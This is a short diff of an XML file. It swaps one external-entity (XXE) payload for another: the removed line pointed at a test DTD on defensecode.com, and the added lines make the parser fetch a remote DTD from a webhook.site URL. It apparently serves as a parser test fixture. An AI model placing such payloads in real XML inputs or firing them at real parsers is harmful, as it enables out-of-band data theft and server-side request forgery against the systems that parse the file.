@@ -1,2 +1,5 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://download.defensecode.com/test.dtd"> %xxe;]>
+<!DOCTYPE project [
+  <!ENTITY % remote SYSTEM "https://webhook.site/d8415954-5eb2-43fe-afbe-9901cfbfe07d">
+  %remote;
+]>
